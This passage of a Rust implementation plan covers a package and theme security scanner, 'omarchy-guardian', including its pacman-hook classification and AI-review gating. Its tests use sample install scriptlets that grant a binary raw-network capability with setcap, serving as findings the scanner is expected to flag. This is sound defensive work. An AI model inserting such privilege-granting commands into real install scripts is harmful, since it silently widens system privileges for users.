        let mut yes = Scripted(Some(true), Vec::new());
        let mut launched = false;
        let status = guard_command(&target, &args(&["true"]), &local_only(), &unavailable(), &mut yes, &mut |_| {
            launched = true;
            ExitCode::SUCCESS
        });
        assert!(launched);
        assert_eq!(status, ExitCode::SUCCESS);
        assert_eq!(yes.1.len(), 1);
    }

    #[test]
    fn confirmation_without_a_terminal_blocks() {
        let dir = TempDir::new("confirm-none");
        fs::write(dir.path().join("theme.conf"), "name = \"good\"\n").unwrap();
        let target = Target {
            class: SourceClass::Theme,
            ..target(&dir)
        };

        let mut no_terminal = Scripted(None, Vec::new());
        let status = guard_command(&target, &args(&["true"]), &local_only(), &unavailable(), &mut no_terminal, &mut |_| {
            panic!("launched without confirmation")
        });
        assert_eq!(status, ExitCode::from(2));
    }

    #[test]
    fn class_and_profile_flags_parse() {
        let Ok(Invocation::Scan(target)) =
            parse(&args(&["scan", "--class", "aur", "--profile", "strict", "dir"]))
        else {
            panic!("expected scan");
        };
        assert_eq!(target.class, SourceClass::Aur);
        assert_eq!(target.profile, Some(Profile::Strict));

        for bad in [
            &["scan", "--class", "official", "dir"][..],
            &["scan", "--class", "nope", "dir"],
            &["scan", "--profile", "paranoid", "dir"],
        ] {
            assert!(parse(&args(bad)).is_err(), "accepted {bad:?}");
        }
    }
```

where `unavailable()` is `OpenCode::At(PathBuf::from("/nonexistent/opencode"))` and the existing `target()` helper gains `class: SourceClass::Source, profile: None`. Existing guard tests pass `&Settings::from_parts(PartialConfig::default(), PartialConfig::default())` and a `Scripted(Some(false), Vec::new())`.

- [ ] **Step 2: Run to verify failure**

Run: `cargo test review cli`
Expected: compile errors.

- [ ] **Step 3: Implement `review.rs`**

```rust
pub struct ReviewContext<'a> {
    pub settings: &'a Settings,
    pub class: SourceClass,
    pub opencode: &'a OpenCode,
}

/// Reviews a file or directory tree as one source class.
pub fn review_tree(config: &ScanConfig, context: &ReviewContext<'_>) -> Report {
    let mut report = Report::new(config.root.display().to_string());
    report.class = context.class;
    report.profile = context.settings.profile_for(context.class).name().to_string();
    report.agent_input_limit = context.settings.agent_settings(context.class).max_input_bytes;

    let (snapshot, walk_gaps) = scan::walk(config, &mut |file: TextFile<'_>| {
        analyze_text(&mut report, file.rel, file.text, true);
    });
    report.snapshot = snapshot;
    report.gaps.extend(walk_gaps);
    if report.text_files_reviewed == 0 {
        report.gaps.push(Gap::NoReviewableFiles);
    }

    audit_dependencies(&mut report);
    run_agents(&mut report, context.settings, context.opencode);
    report
}
```

In `queue_for_agent`, replace `MAX_AGENT_INPUT_SIZE` with `report.agent_input_limit` and delete the `MAX_AGENT_INPUT_SIZE` const.

Replace `run_agent` with:

```rust
/// Runs the AI review for every file whose class policy wants one. Files
/// whose classes resolve to the same agent settings share one call. An
/// oversized or truncated input is already incomplete, so nothing is sent.
pub fn run_agents(report: &mut Report, settings: &Settings, opencode: &OpenCode) {
    let has_oversized = report.snapshot.count(FileKind::OversizedText) > 0;
    if report.agent_input.is_empty() || report.agent_input_overflowed || has_oversized {
        return;
    }

    let mut groups: Vec<(AgentSettings, Vec<SourceFile>)> = Vec::new();
    for file in &report.agent_input {
        let class = report.class_of(&file.path);
        if settings.policy(class).ai == AiRequirement::Off {
            continue;
        }
        let agent_settings = settings.agent_settings(class);
        match groups.iter_mut().find(|(existing, _)| *existing == agent_settings) {
            Some((_, files)) => files.push(file.clone()),
            None => groups.push((agent_settings, vec![file.clone()])),
        }
    }

    for (agent_settings, files) in groups {
        let outcome = match opencode.resolve() {
            Err(error) => AgentOutcome::Unavailable(error),
            Ok(binary) => match agent::review(&binary, &files, &agent_settings) {
                Ok(review) => AgentOutcome::Reviewed(review),
                Err(AgentError::Unavailable(error)) => AgentOutcome::Unavailable(error),
                Err(AgentError::Invalid(error)) => {
                    report.gaps.push(Gap::Agent(error));
                    continue;
                }
            },
        };
        report.agent_runs.push(AgentRun {
            files: files.into_iter().map(|file| file.path).collect(),
            label: agent_settings.label(),
            outcome,
        });
    }
}
```

In `report.rs`: add field `pub agent_input_limit: usize,` to `Report` and set it in `Report::new`:

```rust
    pub fn new(subject: impl Into<String>) -> Self {
        Self {
            subject: subject.into(),
            agent_input_limit: DEFAULT_MAX_INPUT_KIB as usize * 1024,
            ..Self::default()
        }
    }
```

Also: tests that build `Report::default()` and call `analyze_text` must use `Report::new("test")` so the limit is not zero. Update every such test in `review.rs` and `pacman.rs`.

- [ ] **Step 4: Implement `cli.rs`**

1. `Target` becomes:

```rust
#[derive(Debug, PartialEq, Eq)]
struct Target {
    config: ScanConfig,
    show_hashes: bool,
    class: SourceClass,
    profile: Option<Profile>,
}
```

2. `parse_target`: add to `Allowed` a `class: bool` field (true for `scan` and `guard`, false for `sandbox`); parse

```rust
            Some("--class") if allowed.class => {
                let name = args.next().and_then(|name| name.to_str()).unwrap_or_default();
                let parsed = SourceClass::parse(name)
                    .filter(|class| !class.is_privileged())
                    .ok_or_else(|| format!(
                        "--class takes one of: aur, theme, plugin, source (got {name:?})"
                    ))?;
                class = parsed;
            }
            Some("--profile") => {
                let name = args.next().and_then(|name| name.to_str()).unwrap_or_default();
                profile = Some(Profile::parse(name).ok_or_else(|| {
                    format!("--profile takes standard, strict or local-only (got {name:?})")
                })?);
            }
```

with `let mut class = SourceClass::Source; let mut profile = None;` before the loop and both stored in `Target`.

3. Confirmation:

```rust
/// Asks the person at the terminal. Anything but an explicit yes, and any
/// failure to reach a terminal, is a no.
pub trait Confirm {
    fn confirm(&mut self, question: &str) -> bool;
}

pub struct TtyConfirm;

impl Confirm for TtyConfirm {
    fn confirm(&mut self, question: &str) -> bool {
        let Ok(mut tty) = OpenOptions::new().read(true).write(true).open("/dev/tty") else {
            return false;
        };
        if write!(tty, "{question} [y/N] ").and_then(|()| tty.flush()).is_err() {
            return false;
        }
        let mut answer = String::new();
        if BufReader::new(tty).read_line(&mut answer).is_err() {
            return false;
        }
        matches!(answer.trim(), "y" | "Y" | "yes" | "YES")
    }
}
```

4. `run`:

```rust
pub fn run(args: impl Iterator<Item = OsString>) -> ExitCode {
    let args: Vec<OsString> = args.collect();
    let invocation = match parse(&args) {
        Ok(invocation) => invocation,
        Err(message) => {
            eprintln!("omarchy-guardian: {message}\n\n{USAGE}");
            return ExitCode::from(USAGE_ERROR);
        }
    };

    let settings = Settings::load();
    for warning in settings.warnings() {
        eprintln!("omarchy-guardian: {warning}");
    }

    match invocation {
        Invocation::Scan(target) => scan_command(&target, &settings),
        Invocation::Guard(target, command) => guard_command(
            &target,
            &command,
            &settings,
            &OpenCode::UserPath,
            &mut TtyConfirm,
            &mut exec_command,
        ),
        Invocation::Sandbox(target, command) => {
            sandbox_command(&target, &command, &settings, &mut TtyConfirm)
        }
        Invocation::PacmanHook(hook) => pacman_hook_command(&hook, &settings),
    }
}
```

5. A shared helper and the three commands:

```rust
fn settings_for(target: &Target, settings: &Settings) -> Settings {
    match target.profile {
        Some(profile) => settings.clone().with_profile(profile),
        None => settings.clone(),
    }
}

/// Reviews a target and applies confirmation; prints the report.
fn review_and_decide(
    target: &Target,
    settings: &Settings,
    opencode: &OpenCode,
    confirm: Option<&mut dyn Confirm>,
) -> (Report, Decision) {
    let report = review::review_tree(
        &target.config,
        &ReviewContext {
            settings,
            class: target.class,
            opencode,
        },
    );
    let mut decision = report.decide(&|class| settings.policy(class));
    report.print(target.show_hashes, decision);

    if let Some(confirm) = confirm
        && decision.allows_running()
        && settings.policy(target.class).confirm
    {
        let question = format!(
            "Local checks found nothing blocking in {}. No AI review ran. Run it?",
            report.subject
        );
        if !confirm.confirm(&question) {
            decision = Decision::Blocked(Blocked::NotConfirmed);
        }
    }
    (report, decision)
}

fn scan_command(target: &Target, settings: &Settings) -> ExitCode {
    let settings = settings_for(target, settings);
    review_and_decide(target, &settings, &OpenCode::UserPath, None).1.exit_code()
}

fn guard_command(
    target: &Target,
    command: &[OsString],
    settings: &Settings,
    opencode: &OpenCode,
    confirm: &mut dyn Confirm,
    launch: &mut dyn FnMut(&[OsString]) -> ExitCode,
) -> ExitCode {
    let settings = settings_for(target, settings);
    let (report, decision) = review_and_decide(target, &settings, opencode, Some(confirm));

    if !decision.allows_running() {
        eprintln!("Guardian blocked the command because the review did not allow it.");
        return decision.exit_code();
    }
    if let Err(error) = scan::verify_unchanged(&target.config, &report.snapshot) {
        eprintln!("Guardian blocked the command because {error}.");
        return ExitCode::from(2);
    }

    eprintln!(
        "Guardian: review {}; starting {}",
        if decision == Decision::Warned { "passed with warnings" } else { "clear" },
        command.first().map_or_else(String::new, |program| program
            .to_string_lossy()
            .into_owned())
    );
    launch(command)
}

fn sandbox_command(
    target: &Target,
    command: &[OsString],
    settings: &Settings,
    confirm: &mut dyn Confirm,
) -> ExitCode {
    let settings = settings_for(target, settings);
    let (report, decision) =
        review_and_decide(target, &settings, &OpenCode::UserPath, Some(confirm));

    if !decision.allows_running() {
        eprintln!("Guardian did not run the sandbox command because the review did not allow it.");
        return decision.exit_code();
    }
    match sandbox::run(&target.config, &report.snapshot, command) {
        Ok(code) => code,
        Err(error) => {
            eprintln!("Guardian blocked the sandbox run because {error}.");
            ExitCode::from(2)
        }
    }
}

fn pacman_hook_command(hook: &HookArgs, settings: &Settings) -> ExitCode {
    match pacman::review_transaction(hook, settings) {
        Ok(report) => {
            let decision = report.decide(&|class| settings.policy(class));
            report.print(false, decision);
            decision.exit_code()
        }
        Err(error) => {
            eprintln!("Guardian blocked the pacman transaction: {error}");
            ExitCode::from(2)
        }
    }
}
```

Delete the temporary `strict` helper from Task 8. Update `USAGE`:

```rust
const USAGE: &str = "\
Usage:
  omarchy-guardian scan [--thorough] [--hashes] [--exclude NAME]... [--class CLASS] [--profile PROFILE] <file-or-directory>
  omarchy-guardian guard [--thorough] [--hashes] [--exclude NAME]... [--class CLASS] [--profile PROFILE] <file-or-directory> -- <command> [args...]
  omarchy-guardian sandbox [--hashes] [--profile PROFILE] <directory> -- <command> [args...]
  omarchy-guardian pacman-hook --pacman-pid PID --cwd DIR   (run by the pacman hook)

CLASS: aur, theme, plugin, source (default). PROFILE: standard, strict, local-only.
Exit codes: 0 clear or warned, 1 findings, 2 incomplete review, AI unavailable,
not confirmed, or usage error. guard and sandbox replace these with the
command's own exit code once it starts.";
```

- [ ] **Step 5: Adapt `pacman.rs` (interim; Task 10 adds per-target classes)**

```rust
pub fn review_transaction(args: &HookArgs, settings: &Settings) -> Result<Report, Error> {
    if let Some(reason) = settings.privileged_block() {
        return Err(Error::Refused(reason.to_string()));
    }
    let targets = read_targets(io::stdin().lock())?;
    let argv = pacman_argv(args.pacman_pid)?;
    let operation = parse_operation(&argv)?;

    let mut report = Report::new("pacman transaction");
    // Until each target is classified, judge everything as the strictest
    // pacman class.
    report.class = SourceClass::ThirdPartyRepo;
    report.profile = settings.system_profile().name().to_string();
    // ... unchanged loop over targets ...
    review::run_agents(&mut report, settings, &args.opencode);
    Ok(report)
}
```

- [ ] **Step 6: Remove the dead-code markers**

Delete every `#[cfg_attr(not(test), expect(dead_code, reason = "wired into the CLI in Task 9"))]` added in Tasks 2–8.

Run: `grep -rn 'wired into the CLI in Task 9' src/`
Expected: no output. If clippy then reports an item as dead, the item is genuinely unused: delete it rather than re-adding a marker.

- [ ] **Step 7: Run tests, verify and commit**

Run: `cargo fmt --all && cargo clippy --all-targets -- -D warnings && cargo test`
Expected: all pass.

```bash
git add src/
git commit -m "Drive reviews and gates from settings

scan, guard and sandbox load the settings, accept --class and
--profile, review with the class's model, thinking level and input
limit, and run the command on CLEAR or WARNED. local-only asks on
/dev/tty and treats a missing terminal as no. Files sharing agent
settings share one OpenCode call. The pacman hook honours an invalid
system file by blocking."
```

---

### Task 10: Per-package classes in the pacman hook

**Files:**
- Create: `src/classify.rs`
- Modify: `src/pacman.rs`, `src/main.rs` (`mod classify;`)

**Interfaces:**
- Consumes: `Settings::{official_repos, policy}`, `tools::{run, PACMAN_CONF}`, `SourceClass`.
- Produces:
  - `pub fn requires_signatures(siglevel: &str) -> bool`
  - `pub fn repo_class(repo: &str, official_repos: &[String], signatures_required: bool) -> SourceClass`
  - `pub fn strictest(classes: impl IntoIterator<Item = SourceClass>) -> SourceClass`
  - `pub fn siglevel(repo: &str) -> Result<String, Error>`
  - pacman: `pub struct SyncCandidate { pub version_arch: String, pub repo: String }`; `parse_sync_info` returns `HashMap<String, Vec<SyncCandidate>>`; `scan_install_script(...) -> Result<Option<String>, Error>` (the virtual path when a scriptlet existed)

- [ ] **Step 1: Write failing tests**

`src/classify.rs` tests:

```rust
#[cfg(test)]
mod tests {
    use super::{repo_class, requires_signatures, strictest};
    use crate::config::model::SourceClass;

    #[test]
    fn signature_requirements_are_read_from_siglevel() {
        assert!(requires_signatures("Required DatabaseOptional"));
        assert!(requires_signatures("Required\nDatabaseOptional\n"));
        assert!(requires_signatures("PackageRequired TrustedOnly"));
        assert!(!requires_signatures("Never"));
        assert!(!requires_signatures("Optional TrustAll"));
        assert!(!requires_signatures("PackageOptional"));
        assert!(!requires_signatures("Required PackageTrustAll"));
        assert!(!requires_signatures("PackageNever"));
    }

    #[test]
    fn only_listed_signed_repos_are_official() {
        let official = vec!["core".to_string(), "extra".to_string()];
        assert_eq!(repo_class("core", &official, true), SourceClass::Official);
        assert_eq!(repo_class("core", &official, false), SourceClass::ThirdPartyRepo);
        assert_eq!(repo_class("chaotic-aur", &official, true), SourceClass::ThirdPartyRepo);
    }

    #[test]
    fn any_third_party_candidate_makes_the_target_third_party() {
        assert_eq!(strictest([SourceClass::Official]), SourceClass::Official);
        assert_eq!(
            strictest([SourceClass::Official, SourceClass::ThirdPartyRepo]),
            SourceClass::ThirdPartyRepo
        );
        assert_eq!(strictest([]), SourceClass::ThirdPartyRepo);
    }
}
```

`src/pacman.rs` tests: update `parses_sync_database_versions` and add a mixed-transaction test:

```rust
    #[test]
    fn parses_sync_database_versions() {
        let output = "Repository      : core\nName            : linux\nVersion         : 6.10.1.arch1-1\nDescription     : The Linux kernel: and modules\nArchitecture    : x86_64\n\nRepository      : chaotic-aur\nName            : ttf-font\nVersion         : 2:1.0-3\nArchitecture    : any\n";
        let versions = parse_sync_info(output);
        assert_eq!(versions["linux"][0].version_arch, "6.10.1.arch1-1-x86_64");
        assert_eq!(versions["linux"][0].repo, "core");
        assert_eq!(versions["ttf-font"][0].version_arch, "2:1.0-3-any");
        assert_eq!(versions["ttf-font"][0].repo, "chaotic-aur");
    }

    #[test]
    fn mixed_transaction_uses_each_targets_policy() {
        let settings = Settings::from_parts(PartialConfig::default(), PartialConfig::default());
        let policy = |class| settings.policy(class);

        let mut report = Report::new("pacman transaction");
        report.class = SourceClass::ThirdPartyRepo;
        report.file_classes.insert("core-pkg/a/.INSTALL".into(), SourceClass::Official);
        report.file_classes.insert("chaotic-pkg/b/.INSTALL".into(), SourceClass::ThirdPartyRepo);
        analyze_text(&mut report, "core-pkg/a/.INSTALL", "post_install() { setcap cap_net_raw+ep /usr/bin/x; }\n", false);
        analyze_text(&mut report, "chaotic-pkg/b/.INSTALL", "post_install() { true; }\n", false);
        report.agent_runs.push(clear_run(&["core-pkg/a/.INSTALL", "chaotic-pkg/b/.INSTALL"]));
        assert_eq!(report.decide(&policy), Decision::Warned);

        let mut flagged = Report::new("pacman transaction");
        flagged.class = SourceClass::ThirdPartyRepo;
        flagged.file_classes.insert("core-pkg/a/.INSTALL".into(), SourceClass::Official);
        flagged.file_classes.insert("chaotic-pkg/b/.INSTALL".into(), SourceClass::ThirdPartyRepo);
        analyze_text(&mut flagged, "core-pkg/a/.INSTALL", "post_install() { true; }\n", false);
        analyze_text(&mut flagged, "chaotic-pkg/b/.INSTALL", "post_install() { setcap cap_net_raw+ep /usr/bin/x; }\n", false);
        flagged.agent_runs.push(clear_run(&["core-pkg/a/.INSTALL", "chaotic-pkg/b/.INSTALL"]));
        assert_eq!(flagged.decide(&policy), Decision::Blocked(Blocked::Findings));
    }
```

with helper:

```rust
    fn clear_run(files: &[&str]) -> AgentRun {
        AgentRun {
            files: files.iter().map(ToString::to_string).collect(),
            label: "m · low".into(),
            outcome: AgentOutcome::Reviewed(AgentReview {
                status: Status::Clear,
                summary: "ok".into(),
                findings: Vec::new(),
            }),
        }
    }
```

and in `install_scripts_are_read_without_extraction` change `assert!(scan_install_script(...).unwrap())` to `assert_eq!(scan_install_script(&archive, "sample", &mut report).unwrap().as_deref(), Some("sample/sample-1.0-1-any.pkg.tar/.INSTALL"))` and the plain case to `assert_eq!(..., None)`.

- [ ] **Step 2: Run to verify failure**

Run: `cargo test classify pacman`
Expected: compile errors.

- [ ] **Step 3: Implement `src/classify.rs`**

```rust
//! Which source class a pacman sync package belongs to (spec §8).

use std::ffi::OsString;
use std::path::Path;

use crate::config::model::SourceClass;
use crate::error::Error;
use crate::tools::{self, Limits};

/// SigLevel options under which a package can install without a valid
/// signature.
const UNSIGNED: &[&str] = &[
    "Never",
    "Optional",
    "PackageNever",
    "PackageOptional",
    "PackageTrustAll",
];

const LIMITS: Limits = Limits {
    timeout_secs: 30,
    max_output: 64 * 1024,
};

pub fn requires_signatures(siglevel: &str) -> bool {
    !siglevel
        .split(|character: char| character.is_whitespace() || character == '=')
        .any(|token| UNSIGNED.contains(&token))
}

pub fn repo_class(repo: &str, official_repos: &[String], signatures_required: bool) -> SourceClass {
    if signatures_required && official_repos.iter().any(|official| official == repo) {
        SourceClass::Official
    } else {
        SourceClass::ThirdPartyRepo
    }
}

/// A package offered by several repositories is only official if every
/// candidate is; no candidates at all is treated as third-party.
pub fn strictest(classes: impl IntoIterator<Item = SourceClass>) -> SourceClass {
    let mut classes = classes.into_iter().peekable();
    if classes.peek().is_none() {
        return SourceClass::ThirdPartyRepo;
    }
    if classes.all(|class| class == SourceClass::Official) {
        SourceClass::Official
    } else {
        SourceClass::ThirdPartyRepo
    }
}

/// The effective SigLevel of a repository, falling back to the global one
/// when the repository does not set its own.
pub fn siglevel(repo: &str) -> Result<String, Error> {
    let query = |args: Vec<OsString>| -> Result<String, Error> {
        let output = tools::run(
            Path::new(tools::PACMAN_CONF),
            &args,
            None,
            &[("LC_ALL", "C")],
            LIMITS,
        )?
        .into_success()?;
        Ok(String::from_utf8_lossy(&output).trim().to_string())
    };

    let own = query(vec![format!("--repo={repo}").into(), "SigLevel".into()])?;
    if own.is_empty() {
        query(vec!["SigLevel".into()])
    } else {
        Ok(own)
    }
}
```

Add `mod classify;` to `src/main.rs`.

- [ ] **Step 4: Implement the pacman changes**

1. Candidates carry their repo:

```rust
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct SyncCandidate {
    pub version_arch: String,
    pub repo: String,
}
```

`parse_sync_info` returns `HashMap<String, Vec<SyncCandidate>>`; its `flush` also reads `fields.get("Repository")` and pushes `SyncCandidate { version_arch: format!("{version}-{arch}"), repo: (*repo).to_string() }` (a block without `Repository` is skipped). `sync_versions` returns the same map type.

2. `sync_archives(targets, settings) -> Result<(Archives, HashMap<String, SourceClass>), Error>`: after computing `versions`, classify each target:

```rust
    let official_repos = settings.official_repos();
    let mut siglevels: HashMap<String, bool> = HashMap::new();
    let mut classes = HashMap::new();
    for (target, candidates) in &versions {
        let mut candidate_classes = Vec::new();
        for candidate in candidates {
            let required = match siglevels.get(&candidate.repo) {
                Some(required) => *required,
                None => {
                    let required = classify::requires_signatures(&classify::siglevel(&candidate.repo)?);
                    siglevels.insert(candidate.repo.clone(), required);
                    required
                }
            };
            candidate_classes.push(classify::repo_class(&candidate.repo, &official_repos, required));
        }
        classes.insert(target.clone(), classify::strictest(candidate_classes));
    }
```

and use `candidate.version_arch` where `version_arch` was used.

3. `scan_install_script` returns `Result<Option<String>, Error>`: `Ok(None)` where it returned `Ok(false)`, and at the end `Ok(Some(rel))` where `rel` is the `format!("{target}/{archive_name}/.INSTALL")` it already passes to `analyze_text`.

4. `review_transaction`:

```rust
    let (archives, classes) = match operation {
        Operation::Sync => sync_archives(&targets, settings)?,
        Operation::LocalUpgrade => (local_archives(&argv, &args.cwd)?, HashMap::new()),
    };

    for target in &targets {
        let class = match operation {
            Operation::Sync => classes.get(target).copied().unwrap_or(SourceClass::ThirdPartyRepo),
            Operation::LocalUpgrade => SourceClass::LocalPackage,
        };
        match archives.get(target) {
            Some(Ok(paths)) => {
                for archive in paths {
                    match scan_install_script(archive, target, &mut report) {
                        Ok(Some(rel)) => {
                            report.file_classes.insert(rel, class);
                        }
                        Ok(None) => {
                            println!("Pacman package {target}: no install scriptlet to review.");
                        }
                        Err(error) => report.gaps.push(Gap::Package(error)),
                    }
                }
            }
            // ... existing Err / None arms unchanged ...
        }
    }
```

Remove the interim comment from Task 9; keep `report.class = SourceClass::ThirdPartyRepo` as the default for anything untagged.

- [ ] **Step 5: Run tests, verify and commit**

Run: `cargo fmt --all && cargo clippy --all-targets -- -D warnings && cargo test`
Expected: all pass.

```bash
git add src/classify.rs src/pacman.rs src/main.rs
git commit -m "Classify each pacman package by repository and signature policy

A sync package is official only when its repository is listed in the
system file's official_repos and its SigLevel requires signatures;
signed third-party repos such as chaotic-aur are not official. -U
archives are local packages. Each scriptlet is judged by its own
class, so a flagged third-party package blocks a mixed -Syu while a
flagged official scriptlet only warns under the standard profile."
```

---

### Task 11: `config show`, `config check`, `config path`

**Files:**
- Create: `src/config/show.rs`
- Modify: `src/config/mod.rs` (`pub mod show;`), `src/cli.rs`

**Interfaces:**
- Consumes: `Settings` accessors, `resolve::KNOBS`, `Resolved::origin`, `FileStatus`.
- Produces:
  - `pub fn render_show(settings: &Settings, classes: &[SourceClass]) -> String`
  - `pub fn render_check(settings: &Settings) -> (String, bool)` (text, valid)
  - CLI `Invocation::Config(ConfigCommand)` with `enum ConfigCommand { Show(Option<SourceClass>), Check, Path }`

- [ ] **Step 1: Write failing tests**

```rust
#[cfg(test)]
mod tests {
    use std::fs;
    use std::path::Path;

    use super::{render_check, render_show};
    use crate::config::Settings;
    use crate::config::model::SourceClass;
    use crate::test_support::TempDir;

    fn secure(_: &Path) -> Result<(), String> {
        Ok(())
    }

    #[test]
    fn show_lists_values_origins_and_ignored_user_values() {
        let dir = TempDir::new("show");
        let system = dir.path().join("system.toml");
        let user = dir.path().join("user.toml");
        fs::write(&system, "[class.official]\nthinking = \"medium\"\n").unwrap();
        fs::write(&user, "[class.official]\nai = \"off\"\n[class.aur]\nthinking = \"max\"\n").unwrap();
        let settings = Settings::load_from(&system, Some(&user), &secure);

        let text = render_show(&settings, &[SourceClass::Official, SourceClass::Aur]);

        assert!(text.contains("[official]  enforced by the pacman hook"));
        assert!(text.contains("thinking          medium            (system)"));
        assert!(text.contains("ai = off ignored (user file)"));
        assert!(text.contains("[aur]"));
        assert!(text.contains("thinking          max               (user)"));
        assert!(text.contains("agent             default model · max · timeout 300s · input 256 KiB"));
    }

    #[test]
    fn check_fails_on_an_invalid_file() {
        let dir = TempDir::new("check");
        let system = dir.path().join("system.toml");
        fs::write(&system, "profile = \"standard\"\n").unwrap();

        let (text, valid) = render_check(&Settings::load_from(&system, None, &secure));
        assert!(valid, "{text}");

        fs::write(&system, "profile = \"bogus\"\n").unwrap();
        let (text, valid) = render_check(&Settings::load_from(&system, None, &secure));
        assert!(!valid);
        assert!(text.contains("system.toml:1: profile: expected one of"));
    }
}
```

In `src/cli.rs` tests:

```rust
    #[test]
    fn parses_config_subcommands() {
        assert_eq!(parse(&args(&["config", "check"])).unwrap(), Invocation::Config(ConfigCommand::Check));
        assert_eq!(parse(&args(&["config", "path"])).unwrap(), Invocation::Config(ConfigCommand::Path));
        assert_eq!(
            parse(&args(&["config", "show", "--class", "official"])).unwrap(),
            Invocation::Config(ConfigCommand::Show(Some(SourceClass::Official)))
        );
        assert!(parse(&args(&["config"])).is_err());
        assert!(parse(&args(&["config", "edit"])).is_err());
    }
```

- [ ] **Step 2: Run to verify failure**

Run: `cargo test config::show cli`
Expected: compile errors.

- [ ] **Step 3: Implement `src/config/show.rs`**

```rust
//! Human-readable views of the effective settings.

use std::fmt::Write as _;

use crate::config::Settings;
use crate::config::load::FileStatus;
use crate::config::model::{Named, SourceClass};
use crate::config::resolve::KNOBS;

fn status_line(label: &str, path: &str, status: &FileStatus) -> String {
    let state = match status {
        FileStatus::Missing => "not present".to_string(),
        FileStatus::Loaded => "loaded".to_string(),
        FileStatus::Invalid(reason) => format!("INVALID: {reason}"),
    };
    format!("{label:<12} {path} ({state})\n")
}

fn header(settings: &Settings) -> String {
    let mut text = String::new();
    text.push_str(&status_line(
        "System file",
        &settings.system_path().display().to_string(),
        settings.system_status(),
    ));
    text.push_str(&status_line(
        "User file",
        &settings
            .user_path()
            .map_or_else(|| "(no HOME)".to_string(), |path| path.display().to_string()),
        settings.user_status(),
    ));
    if let Some(reason) = settings.privileged_block() {
        let _ = writeln!(text, "Pacman gate: BLOCKED — {reason}");
    }
    text
}

pub fn render_show(settings: &Settings, classes: &[SourceClass]) -> String {
    let mut text = header(settings);

    for class in classes {
        let resolved = settings.resolve(*class);
        let policy = &resolved.policy;
        let agent = settings.agent_settings(*class);
        let scope = if class.is_privileged() {
            "enforced by the pacman hook"
        } else {
            "user-level"
        };

        let _ = writeln!(text, "\n[{}]  {scope} · profile {}", class.name(), settings.profile_for(*class).name());
        for knob in KNOBS {
            let value = match knob {
                "ai" => policy.ai.name().to_string(),
                "on_findings" => policy.on_findings.name().to_string(),
                "on_ai_suspicious" => policy.on_ai_suspicious.name().to_string(),
                "thinking" => policy.thinking.name().to_string(),
                "model" => policy.model.clone().unwrap_or_else(|| "(agent default)".into()),
                "timeout_secs" => policy.timeout_secs().to_string(),
                "confirm" => policy.confirm.to_string(),
                other => format!("(unknown knob {other})"),
            };
            let _ = writeln!(text, "  {knob:<17} {value:<17} ({})", resolved.origin(knob).name());
        }
        let _ = writeln!(
            text,
            "  {:<17} {} · timeout {}s · input {} KiB",
            "agent",
            agent.label(),
            agent.timeout_secs,
            agent.max_input_bytes / 1024
        );
        for ignored in &resolved.ignored {
            let _ = writeln!(text, "  ! {ignored}");
        }
    }
    text
}

/// The check report and whether both files are usable.
pub fn render_check(settings: &Settings) -> (String, bool) {
    let valid = !matches!(settings.system_status(), FileStatus::Invalid(_))
        && !matches!(settings.user_status(), FileStatus::Invalid(_))
        && settings.privileged_block().is_none();
    let mut text = header(settings);
    text.push_str(if valid {
        "Configuration is valid.\n"
    } else {
        "Configuration has errors; see above.\n"
    });
    (text, valid)
}
```

In `render_show`'s test, `thinking          medium            (system)` relies on `{knob:<17} {value:<17}`: `"thinking"` padded to 17 then a space, `"medium"` padded to 17 then a space.

- [ ] **Step 4: Implement the CLI**

```rust
#[derive(Debug, PartialEq, Eq)]
enum ConfigCommand {
    Show(Option<SourceClass>),
    Check,
    Path,
}
```

Add `Config(ConfigCommand)` to `Invocation`; in `parse`, `Some("config") => parse_config(rest).map(Invocation::Config),` with

```rust
fn parse_config(args: &[OsString]) -> Result<ConfigCommand, String> {
    let words: Vec<&str> = args.iter().map(|arg| arg.to_str().unwrap_or_default()).collect();
    match words.as_slice() {
        ["show"] => Ok(ConfigCommand::Show(None)),
        ["show", "--class", name] => SourceClass::parse(name)
            .map(|class| ConfigCommand::Show(Some(class)))
            .ok_or_else(|| format!("unknown class {name:?}")),
        ["check"] => Ok(ConfigCommand::Check),
        ["path"] => Ok(ConfigCommand::Path),
        _ => Err("config takes show [--class CLASS], check or path".into()),
    }
}
```

and in `run`:

```rust
        Invocation::Config(command) => config_command(&command, &settings),
```

```rust
fn config_command(command: &ConfigCommand, settings: &Settings) -> ExitCode {
    match command {
        ConfigCommand::Show(class) => {
            let classes: Vec<SourceClass> = match class {
                Some(class) => vec![*class],
                None => SourceClass::ALL.to_vec(),
            };
            print!("{}", show::render_show(settings, &classes));
            ExitCode::SUCCESS
        }
        ConfigCommand::Check => {
            let (text, valid) = show::render_check(settings);
            print!("{text}");
            if valid { ExitCode::SUCCESS } else { ExitCode::from(2) }
        }
        ConfigCommand::Path => {
            println!("{}", settings.system_path().display());
            if let Some(path) = settings.user_path() {
                println!("{}", path.display());
            }
            ExitCode::SUCCESS
        }
    }
}
```

Add to `USAGE`:

```text
  omarchy-guardian config show [--class CLASS] | check | path
```

- [ ] **Step 5: Run tests, verify and commit**

Run: `cargo fmt --all && cargo clippy --all-targets -- -D warnings && cargo test`

```bash
git add src/config src/cli.rs
git commit -m "Add config show, check and path

show prints every knob of every class with the layer it came from and
each user value the tighten-only rule refused; check validates both
files and the system file's ownership and exits 2 on errors."
```

---

### Task 12: `setup` wizard

**Files:**
- Create: `src/setup.rs`
- Modify: `src/main.rs` (`mod setup;`), `src/cli.rs` (`setup` subcommand)

**Interfaces:**
- Consumes: `config::file::parse`, `config::model::{Profile, Thinking, Named, AgentSettings, builtin, SourceClass}`, `agent::{review, SourceFile, Status}`, `tools::{OpenCode, run, Limits}`.
- Produces:
  - `pub trait Terminal { fn say(&mut self, text: &str); fn ask(&mut self, question: &str) -> Option<String>; }`
  - `pub trait Environment { fn user_opencode(&self) -> Option<PathBuf>; fn system_opencode(&self) -> bool; fn models(&self) -> Vec<String>; fn test_review(&self, settings: &AgentSettings) -> Result<Duration, String>; fn existing_system(&self) -> Option<String>; fn write_user(&self, text: &str) -> Result<PathBuf, String>; fn write_system(&self, text: &str) -> Result<(), String>; fn hook_enabled(&self) -> bool; }`
  - `pub struct Choice { pub profile: Profile, pub model: Option<String>, pub official_model: Option<String>, pub thinking: Thinking }`
  - `pub fn render_user(choice: &Choice) -> String`, `pub fn render_system(choice: &Choice) -> String`
  - `pub fn run(terminal: &mut dyn Terminal, environment: &dyn Environment) -> Result<(), String>`
  - `pub struct TtyTerminal`, `pub struct RealEnvironment`

- [ ] **Step 1: Write failing tests**

```rust
#[cfg(test)]
mod tests {
    use std::cell::RefCell;
